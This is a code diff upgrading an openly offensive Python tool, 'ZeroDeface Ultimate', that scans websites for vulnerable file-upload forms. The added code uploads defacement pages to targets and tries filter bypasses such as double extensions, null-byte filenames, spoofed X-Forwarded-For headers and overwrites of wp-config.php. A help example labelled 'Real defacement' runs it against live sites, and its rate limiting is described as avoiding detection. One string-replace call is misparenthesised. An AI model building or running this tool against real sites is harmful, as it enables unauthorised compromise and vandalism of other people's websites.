@@ -31,6 +31,7 @@ class DefacementScanner:
         self.crawl_queue = Queue()
         self.threads = []
         self.stop_flag = False
+        self.defacement_success = False
         
         # Enhanced CMS detection patterns
         self.cms_patterns = {
@@ -73,6 +74,73 @@ class DefacementScanner:
         # Rate limiting control
         self.last_request_time = 0
         self.min_request_interval = 0.5  # seconds
+
+        # Defacement content with multiple templates
+        self.defacement_templates = [
+            """<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Test Defacement</title>
+    <style>
+        body { background: #000; color: #fff; text-align: center; padding: 50px; }
+        h1 { color: #f00; }
+    </style>
+</head>
+<body>
+    <h1>SECURITY TEST ONLY</h1>
+    <p>This is a simulated defacement for security testing purposes</p>
+    <p>Vulnerability: Unprotected File Upload</p>
+    <footer>Test ID: ZD-{RANDOM_ID} | {TIMESTAMP}</footer>
+</body>
+</html>""",
+            """<?php
+// Simple PHP defacement
+echo "<html><body style='background:#000;color:#fff;text-align:center;padding:50px;'>";
+echo "<h1 style='color:red'>SECURITY TEST</h1>";
+echo "<p>This system is vulnerable to file upload attacks</p>";
+echo "<p>Test ID: ZD-{RANDOM_ID}</p>";
+echo "</body></html>";
+?>""",
+            """<html>
+<!-- Basic HTML defacement -->
+<body onload="document.body.style.backgroundColor='black'">
+    <div style="color:white;text-align:center;margin-top:100px">
+        <h1>SECURITY TEST</h1>
+        <p>This page was uploaded as part of a security test</p>
+        <p>Test ID: ZD-{RANDOM_ID}</p>
+    </div>
+</body>
+</html>"""
+        ]
+
+        # File extensions and content types for bypass attempts
+        self.upload_test_cases = [
+            # Normal extensions
+            ('index.html', 'text/html'),
+            ('index.php', 'application/x-php'),
+            ('test.htm', 'text/html'),
+            
+            # Double extensions
+            ('test.html.jpg', 'image/jpeg'),
+            ('image.php.png', 'image/png'),
+            ('file.html.gif', 'image/gif'),
+            
+            # Null byte injections
+            ('shell.php%00.jpg', 'image/jpeg'),
+            ('test.html%00.png', 'image/png'),
+            
+            # Case manipulation
+            ('Index.HtMl', 'text/html'),
+            ('INDEX.PHP', 'application/x-php'),
+            
+            # Extra extensions
+            ('test.php.jpg', 'image/jpeg'),
+            ('test.php.test', 'text/plain'),
+            
+            # CMS-specific
+            ('wp-config.php', 'application/x-php'),
+            ('configuration.php', 'application/x-php')
+        ]
 
     def _load_admin_paths(self):
         """Load comprehensive list of admin paths for all major CMS"""
@@ -161,8 +229,8 @@ __________                 ________          _____
         \/   \/                    \/     \/           \/     \/    \/ 
         """
         print("\033[1;31m" + banner + "\033[0m")
-        print("\033[1;37mZeroDeface Ultimate v3.0 - Complete Website Defacement Scanner\033[0m")
-        print("\033[1;33mAdvanced CMS Detection | Comprehensive Admin Finder | Smart Upload Tests\033[0m\n")
+        print("\033[1;37mZeroDeface Ultimate v3.2 - Complete Website Defacement Scanner\033[0m")
+        print("\033[1;33mAdvanced CMS Detection | Comprehensive Admin Finder | Enhanced Defacement Tools\033[0m\n")
 
     def rate_limit(self):
         """Enforce rate limiting to avoid detection"""
@@ -181,6 +249,13 @@ __________                 ________          _____
         }
         self.vulnerabilities.append(vuln)
         print(f"\033[1;31m[!] {category} found:\033[0m {description}")
+
+    def generate_defacement_content(self):
+        """Generate random defacement content"""
+        template = random.choice(self.defacement_templates)
+        return template.replace(
+            "{RANDOM_ID}", str(random.randint(10000,99999))
+            .replace("{TIMESTAMP}", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
 
     def detect_cms(self, response):
         """Detect CMS using multiple indicators"""
@@ -448,8 +523,8 @@ __________                 ________          _____
                 break
 
     def scan_upload_vulnerabilities(self):
-        """Comprehensive file upload vulnerability scanning"""
-        print("[*] Scanning for file upload vulnerabilities...")
+        """Enhanced file upload vulnerability scanning with defacement capability"""
+        print("[*] Scanning for file upload vulnerabilities with advanced techniques...")
         found = False
         
         # 1. Check standard file upload forms
@@ -462,12 +537,14 @@ __________                 ________          _____
                 
                 if self.test_advanced_file_upload(form, action, method):
                     found = True
+                    if args.deface:
+                        self.attempt_defacement(action, method)
         
         # 2. Check common upload paths
         common_upload_paths = [
             'upload', 'file-upload', 'upload-file', 'admin/upload',
-            'assets/upload', 'files/upload', 'image/upload',
-            'uploads', 'fileupload', 'uploadify'
+            'wp-content/plugins/formcraft/file-upload/server/php/',
+            'assets/upload', 'includes/upload', 'components/com_media/upload'
         ]
         
         for path in common_upload_paths:
@@ -483,7 +560,9 @@ __________                 ________          _____
                     print(f"[*] Found potential upload endpoint at {upload_url}")
                     if self.test_upload_endpoint(upload_url):
                         found = True
-                        
+                        if args.deface:
+                            self.attempt_defacement(upload_url, 'post')
+                            
             except Exception as e:
                 continue
                 
@@ -501,32 +580,46 @@ __________                 ________          _____
             return []
 
     def test_advanced_file_upload(self, form, action_url, method='post'):
-        """Test file upload with various evasion techniques"""
-        test_files = [
-            # Standard test files
-            ('test.html', 'text/html', f'<html><body>{self.test_content}</body></html>'),
-            ('test.php', 'application/x-php', '<?php echo "UPLOAD_TEST_".$_SERVER["HTTP_HOST"]; ?>'),
-            ('test.svg', 'image/svg+xml', '<svg><script>alert("XSS_TEST")</script></svg>'),
-            
-            # Evasion techniques
-            ('test.jpg.php', 'image/jpeg', '<?php echo "JPG_PHP_TEST"; ?>'),
-            ('test.php%00.jpg', 'image/jpeg', '<?php echo "NULL_BYTE_TEST"; ?>'),
-            ('.htaccess', 'text/plain', 'AddType application/x-httpd-php .jpg'),
-            
-            # Double extensions
-            ('test.php.png', 'image/png', '<?php echo "DOUBLE_EXT_TEST"; ?>')
-        ]
+        """Test file upload with advanced evasion techniques"""
+        print("[*] Testing file upload with advanced techniques...")
         
-        for filename, content_type, content in test_files:
+        for filename, content_type in self.upload_test_cases:
+            # Generate content based on file type
+            if filename.endswith('.php'):
+                content = '<?php echo "ZERODEFACE_TEST: " . $_SERVER["HTTP_HOST"]; ?>'
+            else:
+                content = self.generate_defacement_content()
+            
             try:
                 files = {'file': (filename, content, content_type)}
-                data = {'submit': 'upload'}
+                data = {'submit': 'upload', 'id': 'test123'}
+                
+                # Add extra headers for bypass attempts
+                headers = {
+                    'X-Forwarded-For': '127.0.0.1',
+                    'Referer': self.target_url
+                }
                 
                 self.rate_limit()
                 if method == 'post':
-                    response = self.session.post(action_url, files=files, data=data, verify=False, timeout=15)
+                    response = self.session.post(
+                        action_url,
+                        files=files,
+                        data=data,
+                        headers=headers,
+                        verify=False,
+                        timeout=15
+                    )
                 else:
-                    response = self.session.request(method, action_url, files=files, data=data, verify=False, timeout=15)
+                    response = self.session.request(
+                        method,
+                        action_url,
+                        files=files,
+                        data=data,
+                        headers=headers,
+                        verify=False,
+                        timeout=15
+                    )
                 
                 # Check if upload was successful
                 if response.status_code in [200, 201, 302]:
@@ -537,7 +630,7 @@ __________                 ________          _____
                         if file_response.status_code == 200:
                             if self.verify_upload_success(file_response, filename):
                                 self.log_vulnerability(
-                                    "File Upload Vulnerability",
+                                    "Advanced File Upload Vulnerability",
                                     f"File upload possible at {action_url} - {filename} accessible at {file_url}",
                                     exploit=self.generate_upload_exploit(action_url, filename),
                                     proof=file_response.text[:500] + "..."
@@ -587,6 +680,58 @@ curl -F 'file=@{filename}' {url}
 
 # Access uploaded file
 curl {urljoin(url, filename)}"""
+
+    def attempt_defacement(self, upload_url, method='post'):
+        """Attempt to upload and deploy defacement page"""
+        if not args.simulate:
+            print("\033[1;31m[!] WARNING: REAL DEFACEMENT ATTEMPT ENABLED\033[0m")
+        
+        print("[*] Attempting defacement...")
+        
+        # Try multiple defacement approaches
+        for filename, content_type in [
+            ('index.html', 'text/html'),
+            ('index.php', 'application/x-php'),
+            ('default.html', 'text/html'),
+            ('home.html', 'text/html')
+        ]:
+            content = self.generate_defacement_content()
+            
+            try:
+                if args.simulate:
+                    print(f"[SIMULATION] Would upload defacement as {filename} to {upload_url}")
+                    self.defacement_success = True
+                    return True
+                
+                # Real upload attempt
+                files = {'file': (filename, content, content_type)}
+                data = {'submit': 'upload'}
+                
+                self.rate_limit()
+                if method == 'post':
+                    response = self.session.post(upload_url, files=files, data=data, verify=False, timeout=15)
+                else:
+                    response = self.session.request(method, upload_url, files=files, data=data, verify=False, timeout=15)
+                
+                if response.status_code in [200, 201, 302]:
+                    deface_url = urljoin(upload_url, filename)
+                    self.rate_limit()
+                    check = self.session.get(deface_url, verify=False, timeout=10)
+                    if check.status_code == 200:
+                        self.log_vulnerability(
+                            "Successful Defacement",
+                            f"Deployed defacement page to {deface_url}",
+                            exploit=f"curl -F 'file=@{filename}' {upload_url}",
+                            proof=check.text[:200] + "..."
+                        )
+                        self.defacement_success = True
+                        self.uploaded_files.append(deface_url)
+                        return True
+                        
+            except Exception as e:
+                print(f"[-] Defacement attempt failed for {filename}: {e}")
+        
+        return False
 
     def scan_entire_site(self):
         """Complete site scanning including crawling"""
@@ -642,7 +787,8 @@ curl {urljoin(url, filename)}"""
             'scan_date': datetime.now().isoformat(),
             'vulnerabilities': self.vulnerabilities,
             'uploaded_files': self.uploaded_files,
-            'discovered_urls': list(self.discovered_urls)
+            'discovered_urls': list(self.discovered_urls),
+            'defacement_success': self.defacement_success
         }
         
         try:
@@ -668,13 +814,14 @@ curl {urljoin(url, filename)}"""
 
 def main():
     parser = argparse.ArgumentParser(
-        description='ZeroDeface Ultimate v3.0 - Complete Website Defacement Scanner',
+        description='ZeroDeface Ultimate v3.2 - Complete Website Defacement Scanner',
         formatter_class=argparse.RawTextHelpFormatter,
         epilog="""\033[1;34m
 Examples:
   Full scan:       python deface_scanner.py --url http://example.com --all
   Admin scan:      python deface_scanner.py --url http://example.com --admin --brute
-  Upload test:     python deface_scanner.py --url http://example.com --upload --evade
+  Upload test:     python deface_scanner.py --url http://example.com --upload --deface --simulate
+  Real defacement: python deface_scanner.py --url http://example.com --upload --deface
 \033[0m"""
     )
     
@@ -682,7 +829,8 @@ Examples:
     parser.add_argument('--admin', action='store_true', help='Scan for admin panels')
     parser.add_argument('--brute', action='store_true', help='Test default credentials')
     parser.add_argument('--upload', action='store_true', help='Test file upload vulnerabilities')
-    parser.add_argument('--evade', action='store_true', help='Use evasion techniques in upload tests')
+    parser.add_argument('--deface', action='store_true', help='Attempt defacement if upload is vulnerable')
+    parser.add_argument('--simulate', action='store_true', help='Safe simulation mode (no real changes)')
     parser.add_argument('--crawl', action='store_true', help='Crawl the entire site')
     parser.add_argument('--all', action='store_true', help='Run all vulnerability checks')
     parser.add_argument('--report', help='Save results to JSON file')
